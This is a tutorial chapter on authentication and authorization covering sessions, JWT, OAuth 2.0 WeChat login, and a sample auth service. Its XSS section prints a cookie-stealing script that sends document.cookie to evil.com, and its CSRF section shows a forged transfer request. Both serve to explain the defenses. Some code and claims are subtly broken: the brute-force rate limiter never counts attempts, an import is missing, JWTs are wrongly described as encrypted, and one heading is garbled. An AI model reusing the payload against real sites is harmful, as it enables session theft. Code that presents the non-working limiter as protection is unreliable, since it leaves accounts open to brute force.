# Principles of Authentication and Authorization
> 💡 **Learning Guide**: This chapter takes you deep into the "access control system" of backend architecture — authentication and authorization. We'll start from the most basic "who are you" and progressively master modern authentication schemes like Session, JWT, OAuth 2.0, and more.

<AuthEvolutionDemo />

## 0. Introduction: The System's "Gatekeeper"

Why does WeChat still know who you are when you close and reopen the app?
How does Bilibili know if you're a premium member or a regular user?
Why can you log into third-party websites by scanning a QR code with WeChat, without entering a password?

Behind all of these lies one core system: **Authentication & Authorization**.

If we compare a backend system to an office building:

- **Authentication**: Confirms "who you are" (verifying an ID badge / access card).
- **Authorization**: Confirms "where you can go" (VIPs can enter the VIP lounge; regular users cannot).

### 0.1 Motivation for needing Authentication

There's only one reason: **to protect resources**.

- **Privacy Protection**: Your personal information and chat history — only you can see them.
- **Permission Control**: An admin can delete users; a regular user cannot.
- **Abuse Prevention**: Prevents malicious API calls and brute-forcing of endpoints.

<AuthBasicsDemo />

### 0.2 Interactive Demo: Login Flow

Let's understand how authentication and authorization work through a real login demonstration.

<AuthInteractiveLoginDemo />

**Key Point**: Authentication is the first line of defense — every sensitive operation must first verify identity.

---

## 1. Core Concepts: Authentication vs Authorization

### 1.1 Authentication: Who Overview of You

Confirms a user's identity.

- *Example*: Entering a username and password, fingerprint scanning, facial recognition.
- *Output*: A token that represents "you."
- *Abbreviation*: **AuthN**

### 1.2 Authorization: What Can You Do

Confirms what permissions a user has.

- *Example*: An admin can delete posts; a regular user can only like them.
- *Output*: Allow or deny access.
- *Abbreviation*: **AuthZ**

### 1.3 The Relationship Between the Two

```
User Request → Authentication (Who are you?) → Authorization (Can you do this?) → Execute Business Logic
               ↓                                  ↓
          Verify identity                   Check permissions
          (Is the Token valid?)             (Does the user have delete permission?)
```

<AuthNvsAuthZDemo />

**Key Point**: Authenticate first, then authorize. Only after confirming "who you are" can you determine "what you can do."

---

## 2. Evolution of Authentication Schemes

### 2.1 First Generation: HTTP Basic Authentication

The oldest approach — directly placing the username and password in the HTTP header.

```http
GET /api/user/profile HTTP/1.1
Host: example.com
Authorization: Basic dXNlcm5hbWU6cGFzc3dvcmQ=
                      (base64("username:password"))
```

- **Pros**: Simple; supported by all browsers.
- **Cons**:
  - Insecure (Base64 is decodable — effectively plaintext).
  - Password must be sent with every request (easy to intercept).
  - Cannot proactively log out (unless you close the browser).

**Verdict**: Only suitable for internal testing tools; never use in production.

### 2.2 Second Generation: Session + Cookie

The classic approach for web development.

**Flow**:

```
1. User logs in (POST /login)
   → Server validates username and password
   → Creates a Session (in server memory or Redis)
   → Returns Set-Cookie: session_id=abc123

2. Subsequent requests
   → Browser automatically sends Cookie: session_id=abc123
   → Server looks up Session by session_id
   → If found, the user is considered "who they claim to be"
```

**Code Example**:

```python
# Backend (Python Flask)
from flask import session, request

@app.route("/login", methods=["POST"])
def login():
    username = request.json["username"]
    password = request.json["password"]

    # Verify username and password
    user = db.authenticate(username, password)
    if user:
        # Create Session
        session["user_id"] = user.id
        session["role"] = user.role
        return {"status": "success"}
    else:
        return {"error": "Incorrect username or password"}, 401

@app.route("/api/admin/users")
def get_users():
    # Check Session
    if "user_id" not in session:
        return {"error": "Not logged in"}, 401

    # Check permissions
    if session.get("role") != "admin":
        return {"error": "Insufficient permissions"}, 403

    # Execute business logic
    users = db.get_all_users()
    return {"users": users}
```

<SessionCookieDemo />

**Pros**:

- Simple and intuitive; easy to understand.
- Server can proactively log out (delete the Session).

**Cons**:

- **Server is stateful**: Needs to store Sessions; multiple servers require shared storage (e.g., Redis).
- **Cross-origin difficulties**: Cookies are not cross-origin by default (CORS issues).
- **CSRF attacks**: Malicious websites can impersonate your Cookie.

**Verdict**: Suitable for traditional web applications (server-side rendering); not suitable for mobile or modern SPAs.

### 2.3 Third Generation: Token (JWT)

The mainstream approach for modern web applications.

**Core Idea**: Don't store state on the server. Encrypt user information into a Token and store it on the client.

**JWT Structure**:

```
JWT = Header.Payload.Signature

Example:
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoxMjMsInJvbGUiOiJhZG1pbiIsImV4cCI6MTYxNjIzOTAyMn0.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
 |--------------------------------| |-----------------------------------------------| |----------------------------|
           Header                           Payload                                      Signature
```

- **Header**: Algorithm information (e.g., `{"alg": "HS256", "typ": "JWT"}`).
- **Payload**: User information (e.g., `{"user_id": 123, "role": "admin", "exp": 1616239022}`).
- **Signature**: Tamper-proof signature.

**Flow**:

```python
# 1. User login
@app.route("/login", methods=["POST"])
def login():
    username = request.json["username"]
    password = request.json["password"]

    user = db.authenticate(username, password)
    if user:
        # Generate JWT
        token = jwt.encode(
            {
                "user_id": user.id,
                "role": user.role,
                "exp": datetime.now() + timedelta(hours=24)  # Expires in 24 hours
            },
            SECRET_KEY,
            algorithm="HS256"
        )
        return {"token": token}
    else:
        return {"error": "Incorrect username or password"}, 401

# 2. Subsequent requests
@app.route("/api/admin/users")
def get_users():
    # Get Token from Header
    auth_header = request.headers.get("Authorization")
    if not auth_header or not auth_header.startswith("Bearer "):
        return {"error": "No Token provided"}, 401

    token = auth_header.split(" ")[1]

    try:
        # Verify and parse Token
        payload = jwt.decode(token, SECRET_KEY, algorithms=["HS256"])
    except jwt.ExpiredSignatureError:
        return {"error": "Token has expired"}, 401
    except jwt.InvalidTokenError:
        return {"error": "Token is invalid"}, 401

    # Check permissions
    if payload.get("role") != "admin":
        return {"error": "Insufficient permissions"}, 403

    # Execute business logic
    users = db.get_all_users()
    return {"users": users}
```

<JWTWorkflowDemo />

**Pros**:

- **Stateless**: No Session storage on the server; easy to scale horizontally.
- **Cross-origin friendly**: Stored in a Header, not subject to Cookie cross-origin restrictions.
- **Mobile friendly**: Native apps can easily use it as well.
- **Rich information**: The Payload can store user information, permissions, etc.

**Cons**:

- **Cannot proactively log out**: Once issued, a Token remains valid until it expires (unless using a blocklist).
- **Payload is visible**: Base64-encoded — do not store sensitive information (e.g., passwords).
- **Large Token size**: Must be sent with every request — several hundred bytes.

**Verdict**: The standard approach for modern web and mobile applications.

<SessionVsJWTDemo />

---

## 3. OAuth 2.0: Third-Party Login

You've definitely seen these buttons: "Log in with WeChat," "Log in with Google."

This is **OAuth 2.0**: an **authorization** framework (not authentication!).

### 3.1 Core Roles

| Role                     | Description                        | Example                      |
| :----------------------- | :--------------------------------- | :--------------------------- |
| **Resource Owner**       | The owner of the resources (user)  | You                          |
| **Client**               | The third-party application        | Some website                 |
| **Authorization Server** | The authorization server           | WeChat, Google               |
| **Resource Server**      | The resource server                | WeChat's user information API |

### 3.2 Authorization Code Flow

The most secure mode — suitable for servers with a backend.

**Flow**:

```
1. User clicks "Log in with WeChat"
   → Redirects to the WeChat authorization page
   https://open.weixin.qq.com/connect/qrconnect?
     appid=APPID&
     redirect_uri=https://yourapp.com/callback&
     response_type=code&
     scope=snsapi_login&
     state=STATE

2. User scans the QR code and grants authorization
   → WeChat redirects back to your website
   https://yourapp.com/callback?code=AUTHORIZATION_CODE&state=STATE

3. Your backend exchanges the code for an access_token
   POST https://api.weixin.qq.com/sns/oauth2/access_token
   {
     "appid": "APPID",
     "secret": "SECRET",
     "code": "AUTHORIZATION_CODE",
     "grant_type": "authorization_code"
   }
   → Returns: { "access_token": "...", "openid": "..." }

4. Use the access_token to fetch user information
   GET https://api.weixin.qq.com/sns/userinfo?
     access_token=ACCESS_TOKEN&
     openid=OPENID
   → Returns: { "nickname": "Zhang San", "headimgurl": "..." }
```

<OAuth2FlowDemo />

**Code Example**:

```python
from flask import request, redirect

@app.route("/login/wechat")
def login_wechat():
    # 1. Redirect to WeChat authorization page
    auth_url = (
        "https://open.weixin.qq.com/connect/qrconnect"
        f"?appid={APPID}"
        f"&redirect_uri={urlencode(REDIRECT_URI)}"
        "&response_type=code"
        "&scope=snsapi_login"
        f"&state={generate_state()}"
    )
    return redirect(auth_url)

@app.route("/callback")
def wechat_callback():
    # 2. Get the code
    code = request.args.get("code")
    state = request.args.get("state")

    # Verify state (anti-CSRF)
    if not verify_state(state):
        return {"error": "Invalid state"}, 400

    # 3. Exchange the code for an access_token
    token_resp = requests.post(
        "https://api.weixin.qq.com/sns/oauth2/access_token",
        params={
            "appid": APPID,
            "secret": SECRET,
            "code": code,
            "grant_type": "authorization_code"
        }
    ).json()

    access_token = token_resp["access_token"]
    openid = token_resp["openid"]

    # 4. Fetch user information
    user_info = requests.get(
        "https://api.weixin.qq.com/sns/userinfo",
        params={
            "access_token": access_token,
            "openid": openid
        }
    ).json()

    # 5. Create or update local user
    user = db.get_or_create_user(
        openid=openid,
        nickname=user_info["nickname"],
        avatar=user_info["headimgurl"]
    )

    # 6. Generate this system's JWT
    token = jwt.encode(
        {"user_id": user.id, "exp": ...},
        SECRET_KEY
    )

    return {"token": token}
```

**Key Points**:

- **The code can only be used once**: It expires after use, preventing interception.
- **state prevents CSRF**: Generate a random string; verify it on callback to prevent malicious spoofing.
- **redirect_uri must match**: Register it in advance on the WeChat Open Platform to prevent redirect attacks.

### 3.3 Other Modes

| Mode                                   | Use Case                                | Security          |
| :------------------------------------- | :-------------------------------------- | :---------------- |
| **Authorization Code**                 | Servers with a backend                  | ⭐⭐⭐⭐⭐          |
| **Implicit**                           | Pure frontend apps (SPA)                | ⭐⭐⭐ (deprecated) |
| **Resource Owner Password**            | Highly trusted apps (e.g., official app) | ⭐⭐               |
| **Client Credentials**                 | Server-to-server communication (no user) | ⭐⭐⭐⭐            |

<OAuth2ModesDemo />

---

## 4. In Practice: Designing a Complete Authentication System

### 4.1 Requirements Analysis

- **Multi-platform support**: Web, iOS, Android.
- **Third-party login**: WeChat, Google.
- **Permission control**: Regular users, VIPs, admins.
- **Security**: Anti-brute-force, anti-hijacking, anti-replay.

### 4.2 Architecture Design

```
┌─────────────┐
│    Client    │
└──────┬──────┘
       │
       ▼
┌─────────────────────────────────┐
│         API Gateway             │
│  - Rate Limiting                │
│  - Token Validation             │
└──────┬──────────────────────────┘
       │
       ▼
┌─────────────────────────────────┐
│      Auth Service               │
│  - Registration, Login          │
│  - Token Issuance & Validation  │
│  - OAuth 2.0 Integration        │
└──────┬──────────────────────────┘
       │
       ▼
┌─────────────────────────────────┐
│    Business Services            │
│  - User Service                 │
│  - Order Service                │
│  - Payment Service              │
└─────────────────────────────────┘
```

### 4.3 Database Design

```sql
-- Users table
CREATE TABLE users (
    id BIGINT PRIMARY KEY AUTO_INCREMENT,
    username VARCHAR(50) UNIQUE NOT NULL,
    password_hash VARCHAR(255) NOT NULL,  -- bcrypt hash
    email VARCHAR(100) UNIQUE,
    role ENUM('user', 'vip', 'admin') DEFAULT 'user',
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
    INDEX idx_username (username),
    INDEX idx_email (email)
);

-- Third-party login binding table
CREATE TABLE user_auth_providers (
    id BIGINT PRIMARY KEY AUTO_INCREMENT,
    user_id BIGINT NOT NULL,
    provider ENUM('wechat', 'google', 'github') NOT NULL,
    provider_user_id VARCHAR(100) NOT NULL,  -- Third-party user ID
    access_token TEXT,  -- Encrypted storage
    refresh_token TEXT,
    expires_at TIMESTAMP,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    UNIQUE KEY uk_provider_provider_user_id (provider, provider_user_id),
    FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE CASCADE
);

-- Token blocklist (for proactive logout)
CREATE TABLE token_blacklist (
    id BIGINT PRIMARY KEY AUTO_INCREMENT,
    token_jti VARCHAR(100) UNIQUE NOT NULL,  -- JWT JTI (unique identifier)
    expired_at TIMESTAMP NOT NULL,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    INDEX idx_expired_at (expired_at)
);
```

<AuthDatabaseDemo />

### 4.4 Code Implementation

```python
# auth_service.py
import bcrypt
import jwt
from datetime import datetime, timedelta

SECRET_KEY = "your-secret-key-here"  # Use an environment variable in production

class AuthService:
    def register(self, username: str, password: str, email: str = None):
        # 1. Check if the username already exists
        if db.get_user_by_username(username):
            raise ValueError("Username already exists")

        # 2. Hash the password (bcrypt)
        password_hash = bcrypt.hashpw(
            password.encode('utf-8'),
            bcrypt.gensalt(rounds=12)
        ).decode('utf-8')

        # 3. Create the user
        user = db.create_user(
            username=username,
            password_hash=password_hash,
            email=email
        )

        # 4. Issue Tokens
        return self._generate_tokens(user)

    def login(self, username: str, password: str):
        # 1. Look up the user
        user = db.get_user_by_username(username)
        if not user:
            raise ValueError("Incorrect username or password")

        # 2. Verify the password
        if not bcrypt.checkpw(
            password.encode('utf-8'),
            user.password_hash.encode('utf-8')
        ):
            raise ValueError("Incorrect username or password")

        # 3. Issue Tokens
        return self._generate_tokens(user)

    def _generate_tokens(self, user):
        now = datetime.now()

        # Access Token (short-lived, e.g., 1 hour)
        access_token = jwt.encode(
            {
                "user_id": user.id,
                "role": user.role,
                "type": "access",
                "iat": now,
                "exp": now + timedelta(hours=1),
                "jti": str(uuid4())  # Unique identifier
            },
            SECRET_KEY,
            algorithm="HS256"
        )

        # Refresh Token (long-lived, e.g., 30 days)
        refresh_token = jwt.encode(
            {
                "user_id": user.id,
                "type": "refresh",
                "iat": now,
                "exp": now + timedelta(days=30),
                "jti": str(uuid4())
            },
            SECRET_KEY,
            algorithm="HS256"
        )

        return {
            "access_token": access_token,
            "refresh_token": refresh_token,
            "token_type": "Bearer",
            "expires_in": 3600  # access_token expiration time (seconds)
        }

    def refresh(self, refresh_token: str):
        try:
            payload = jwt.decode(refresh_token, SECRET_KEY, algorithms=["HS256"])
            if payload.get("type") != "refresh":
                raise ValueError("Invalid token type")

            user = db.get_user_by_id(payload["user_id"])
            return self._generate_tokens(user)
        except jwt.ExpiredSignatureError:
            raise ValueError("Refresh token has expired")
        except jwt.InvalidTokenError:
            raise ValueError("Refresh token is invalid")

    def logout(self, token: str):
        # Add the Token to the blocklist
        payload = jwt.decode(token, SECRET_KEY, algorithms=["HS256"])
        db.add_to_blacklist(
            jti=payload["jti"],
            expired_at=datetime.fromtimestamp(payload["exp"])
        )

    def verify_token(self, token: str):
        try:
            payload = jwt.decode(token, SECRET_KEY, algorithms=["HS256"])

            # Check if it's in the blocklist
            if db.is_token_blacklisted(payload["jti"]):
                raise ValueError("Token has been revoked")

            return payload
        except jwt.ExpiredSignatureError:
            raise ValueError("Token has expired")
        except jwt.InvalidTokenError:
            raise ValueError("Token is invalid")

# API decorators
def require_auth(auth_service: AuthService):
    def decorator(f):
        def wrapper(*args, **kwargs):
            # Get Token from Header
            auth_header = request.headers.get("Authorization")
            if not auth_header or not auth_header.startswith("Bearer "):
                return {"error": "No Token provided"}, 401

            token = auth_header.split(" ")[1]

            try:
                # Verify Token
                payload = auth_service.verify_token(token)
                # Inject user information into the request context
                request.user = payload
                return f(*args, **kwargs)
            except ValueError as e:
                return {"error": str(e)}, 401

        return wrapper
    return decorator

def require_role(*roles):
    def decorator(f):
        def wrapper(*args, **kwargs):
            if not hasattr(request, "user"):
                return {"error": "Not logged in"}, 401

            if request.user["role"] not in roles:
                return {"error": "Insufficient permissions"}, 403

            return f(*args, **kwargs)
        return wrapper
    return decorator

# Usage example
@app.route("/api/admin/users", methods=["GET"])
@require_auth(auth_service)
@require_role("admin")
def get_users():
    users = db.get_all_users()
    return {"users": users}

@app.route("/api/user/profile", methods=["GET"])
@require_auth(auth_service)
def get_profile():
    user = db.get_user_by_id(request.user["user_id"])
    return {"user": user}

@app.route("/auth/refresh", methods=["POST"])
def refresh_token():
    refresh_token = request.json.get("refresh_token")
    try:
        tokens = auth_service.refresh(refresh_token)
        return tokens
    except ValueError as e:
        return {"error": str(e)}, 401
```

<CompleteAuthSystemDemo />

---

## 5. Security Best Practices

### 5.1 Password Storage

**❌ Wrong approach**:

```python
# Plaintext storage (absolutely not!)
db.save_password(username, password)

# MD5 / SHA1 hashing (not secure enough — vulnerable to rainbow table attacks)
hash = md5(password)
db.save_password(username, hash)
```

**✅ Correct approach**:

```python
# bcrypt (adaptive hashing; slow hashing prevents brute-force attacks)
import bcrypt

password_hash = bcrypt.hashpw(
    password.encode('utf-8'),
    bcrypt.gensalt(rounds=12)  # More rounds = more secure, but also slower
)

# Verification
if bcrypt.checkpw(password.encode('utf-8'), password_hash):
    # Password is correct
```

**Why bcrypt?**

- **Slow**: Deliberately designed to be slow (millisecond-level) to prevent brute-force attacks.
- **Adaptive**: You can adjust the rounds to strengthen it as hardware improves.
- **Salted**: Includes a built-in random salt to prevent rainbow table attacks.

<PasswordHashingDemo />

### 5.2 Brute-Force Prevention

- **Rate Limiting**: The same IP / username can only attempt 5 times per minute.
- **CAPTCHA**: Require a CAPTCHA after 3 failed attempts.
- **Account Lockout**: Lock the account for 30 minutes after 10 failed attempts.

```python
from functools import lru_cache
import time

@lru_cache(maxsize=10000)
def get_login_attempts(identifier: str) -> tuple:
    """Returns (attempt count, time of first attempt)"""
    return (0, 0)

def check_rate_limit(identifier: str):
    attempts, first_attempt = get_login_attempts(identifier)
    now = time.time()

    # Reset after 1 minute
    if now - first_attempt > 60:
        get_login_attempts.cache_clear()
        return True

    # Reject if over 5 attempts
    if attempts >= 5:
        return False

    return True

def record_login_attempt(identifier: str):
    attempts, first_attempt = get_login_attempts(identifier)
    if attempts == 0:
        first_attempt = time.time()
    get_login_attempts.cache_clear()
    get_login_attempts(identifier)  # Re-cache

@app.route("/login", methods=["POST"])
def login():
    username = request.json["username"]

    # Check rate limit
    if not check_rate_limit(username):
        return {"error": "Too many attempts. Please try again in 1 minute."}, 429

    password = request.json["password"]

    # Verify password
    user = db.get_user_by_username(username)
    if user and bcrypt.checkpw(password.encode(), user.password_hash.encode()):
        # Login successful — clear the counter
        get_login_attempts.cache_clear()
        return {"token": generate_token(user)}
    else:
        # Login failed — record the attempt
        record_login_attempt(username)
        return {"error": "Incorrect username or password"}, 401
```

### 5.3 CSRF Prevention (Cross-Site Request Forgery)

**Attack Scenario**:
You log into your bank's website `bank.com`, then visit a malicious website `evil.com`. The page on `evil.com` contains this code:

```html
<img src="https://bank.com/api/transfer?to=attacker&amount=10000" />
```

Your browser will send this request with the bank's Cookie (cross-origin request), causing funds to be transferred without your knowledge.

**Defense Measures**:

1.  **CSRF Token**:
    - The server generates a random Token and places it in a form field.
    - Verify that the Token matches on submission.

```python
from flask import session

@app.route("/api/transfer", methods=["POST"])
def transfer():
    # Verify CSRF Token
    token = request.headers.get("X-CSRF-Token")
    if token != session.get("csrf_token"):
        return {"error": "CSRF Token is invalid"}, 403

    # Execute the transfer
    ...
```

2.  **SameSite Cookie**:
    - Set the Cookie's `SameSite` attribute to `Strict` or `Lax`.

```python
# Flask example
app.config.update(
    SESSION_COOKIE_SAMESITE='Lax',  # or 'Strict'
    SESSION_COOKIE_SECURE=True      # HTTPS only
)
```

3.  **Use JWT (no Cookies)**:
    - JWT is stored in `localStorage` and is not automatically attached to requests — naturally immune to CSRF.

<CSRFDefenseDemo />

### 5.4 XSS Prevention (Cross-Site Scripting)

**Attack Scenario**:
A malicious user enters the following in a comment section:

```html
<script>
  fetch('https://evil.com/steal?cookie=' + document.cookie)
</script>
```

If the website renders this content directly, other users' Cookies will be stolen.

**Defense Measures**:

1.  **Output Escaping**:
    - Convert `<` to `&lt;` and `>` to `&gt;`.

```python
import html

def render_comment(comment):
    # Escape HTML
    safe_comment = html.escape(comment)
    return f"<div class='comment'>{safe_comment}</div>"
```

2.  **Content Security Policy (CSP)**:
    - Set an HTTP header to restrict script sources.

```http
Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.example.com
```

3.  **HttpOnly Cookie**:
    - Set the Cookie's `HttpOnly` attribute so JavaScript cannot read it.

```python
app.config.update(
    SESSION_COOKIE_HTTPONLY=True
)
```

<XSSDefenseDemo />

---

## 6. Summary & Learning Roadmap

Authentication is a "fundamental skill" of backend systems. Mastering it is essential to building secure and reliable applications.

### 6.1 Core Knowledge Points

| Topic                         | Importance   | Difficulty | Real-World Frequency |
| :---------------------------- | :----------- | :--------- | :------------------- |
| **Session + Cookie**          | ⭐⭐⭐⭐     | Medium     | High                 |
| **JWT**                       | ⭐⭐⭐⭐⭐   | Low        | Very High            |
| **OAuth 2.0**                 | ⭐⭐⭐⭐     | High       | High                 |
| **Password Hashing (bcrypt)** | ⭐⭐⭐⭐⭐   | Low        | Very High            |
| **Rate Limiting & Anti-Brute-Force** | ⭐⭐⭐⭐⭐   | Medium     | Very High            |
| **CSRF Defense**              | ⭐⭐⭐⭐     | Medium     | Medium               |
| **XSS Defense**               | ⭐⭐⭐⭐     | Low        | High                 |

### 6.2 Learning Roadmap

1.  **Getting Started** (1–2 days):
    - Understand authentication vs. authorization.
    - Master the principles of Session + Cookie.
    - Implement a simple login and registration feature.

2.  **Intermediate** (1 week):
    - Learn the principles and implementation of JWT.
    - Implement a JWT-based authentication system.
    - Master password hashing (bcrypt).

3.  **Practical Application** (2–4 weeks):
    - Integrate OAuth 2.0 (WeChat, Google login).
    - Implement rate limiting and brute-force prevention.
    - Defend against CSRF, XSS, and other common attacks.

4.  **Going Deeper** (ongoing):
    - Study RBAC (Role-Based Access Control).
    - Research SSO (Single Sign-On).
    - Explore Zero Trust Architecture.

### 6.3 Recommended Resources

- **Standards**:
  - RFC 6749 (OAuth 2.0)
  - RFC 7519 (JWT)
- **Articles**:
  - JWT.io: https://jwt.io/
  - OAuth 2.0 Simplified: https://oauth.net/2/
- **Tools**:
  - jwt.io (Online JWT debugger)
  - Postman (API testing)

---

## 7. Glossary

| Term              | Full Name                    | Explanation                                                                                             |
| :---------------- | :--------------------------- | :------------------------------------------------------------------------------------------------------ |
| **AuthN**         | Authentication               | **Authentication**. Verifies "who you are" (e.g., entering a password to verify identity).              |
| **AuthZ**         | Authorization                | **Authorization**. Verifies "what you can do" (e.g., only admins can delete).                            |
| **Session**       | -                            | **Session**. Server-side user state information.                                                        |
| **Cookie**        | -                            | **Cookie**. A small piece of data stored by the browser, automatically sent with every request.          |
| **JWT**           | JSON Web Token               | **JSON Web Token**. A stateless authentication scheme consisting of Header, Payload, and Signature.     |
| **OAuth 2.0**     | -                            | **Open Authorization**. A standardized framework for third-party login (e.g., "Log in with WeChat").    |
| **SSO**           | Single Sign-On               | **Single Sign-On**. Log in once to access multiple applications (e.g., Google account across all Google services). |
| **RBAC**          | Role-Based Access Control    | **Role-Based Access Control**. Determines permissions based on a user's role (e.g., admin, user).       |
| **CSRF**          | Cross-Site Request Forgery   | **Cross-Site Request Forgery**. An attacker tricks a user into sending a malicious request (e.g., using your Cookie to initiate a transfer). |
| **XSS**           | Cross-Site Scripting         | **Cross-Site Scripting**. An attacker injects malicious scripts into a web page (e.g., stealing Cookies). |
| **bcrypt**        | -                            | **Password Hashing Algorithm**. A slow hashing algorithm specifically designed for password storage; prevents brute-force attacks. |
| **Access Token**  | -                            | **Access Token**. A short-lived token used to access APIs.                                              |
| **Refresh Token** | -                            | **Refresh Token**. A long-lived token used to obtain a new Access Token.                                |
| **Scope**         | -                            | **Permission Scope**. An OAuth 2.0 concept representing the permissions requested by a third-party application (e.g., read user information). |
| **PKCE**          | Proof Key for Code Exchange  | **Proof Key for Code Exchange**. An OAuth 2.0 extension for security hardening of public clients (e.g., SPAs). |